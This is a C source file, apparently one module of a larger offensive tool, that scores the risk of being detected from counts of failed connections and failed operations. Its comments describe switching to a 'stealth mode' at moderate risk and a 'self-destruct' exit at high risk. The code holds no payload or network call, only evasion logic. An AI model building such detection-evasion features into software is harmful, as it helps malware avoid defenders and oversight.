#include "risk_assessment.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Global counters for behavioral signals
static int failed_connections = 0;
static int failed_operations = 0;
static int successful_operations = 0;

// Network signal collection
static int collect_network_signals(void) {
    return failed_connections;
}

// System signal collection
static int collect_system_signals(void) {
    return 0;
}

// Behavioral signal collection
// Calculates failure rate as indicator of detection/blocking
// High failure rate suggests operations are being blocked or detected
static int collect_behavioral_signals(void) {
    int total_ops = failed_operations + successful_operations;
    if (total_ops == 0) return 0;
    
    // Convert failure rate (0.0-1.0) to risk score (0-10)
    double failure_rate = (double)failed_operations / total_ops;
    return (int)(failure_rate * 10);
}

// Calculate network risk (0-10)
// Maps failed connection count to risk score using tiered thresholds
// More failures = higher risk of network-based detection
static int calculate_network_risk(int failed_conns) {
    if (failed_conns == 0) return 0;      // No failures = no risk
    if (failed_conns <= 2) return 2;    // Low failures = low risk
    if (failed_conns <= 5) return 5;    // Moderate failures = moderate risk
    if (failed_conns <= 10) return 8;   // High failures = high risk
    return 10;                           // Very high failures = maximum risk
}

// Calculate system risk (0-10)
static int calculate_system_risk(int sys_signal) {
    return sys_signal;
}

// Calculate behavioral risk (0-10)
static int calculate_behavioral_risk(int beh_signal) {
    return beh_signal;
}

// Main risk assessment function
// Evaluates detection signals from multiple sources and calculates weighted total risk
// 
// Risk calculation:
// 1. Collect signals: network (failed connections), system (resource usage), behavioral (failure rate)
// 2. Calculate individual risk scores (0-10) for each category
// 3. Weighted combination: Network 40%, System 30%, Behavioral 30%
// 4. Clamp to 0-10 range
//
// Risk thresholds (used by main loop):
// - total_risk < 4:  Normal mode (proceed with operations)
// - total_risk 4-6:  Stealth mode (reduce activity, longer delays)
// - total_risk >= 7: Self-destruct (critical risk, exit immediately)
risk_assessment_t assess_risk(void) {
    risk_assessment_t risk = {0};
    
    // Collect detection signals from different sources
    int net_signal = collect_network_signals();
    int sys_signal = collect_system_signals();
    int beh_signal = collect_behavioral_signals();
    
    // Calculate individual risk scores (0-10 scale)
    risk.network_risk = calculate_network_risk(net_signal);
    risk.system_risk = calculate_system_risk(sys_signal);
    risk.behavioral_risk = calculate_behavioral_risk(beh_signal);
    
    // Weighted total: Network weighted highest (most reliable detection signal)
    risk.total_risk = (int)(
        (risk.network_risk * 0.40) +
        (risk.system_risk * 0.30) +
        (risk.behavioral_risk * 0.30)
    );
    
    // Clamp to valid range [0, 10]
    if (risk.total_risk > 10) risk.total_risk = 10;
    if (risk.total_risk < 0) risk.total_risk = 0;
    
    return risk;
}

// Update behavioral signals
void update_failed_connection(void) {
    failed_connections++;
}

void update_failed_operation(void) {
    failed_operations++;
}

void update_successful_operation(void) {
    successful_operations++;
}

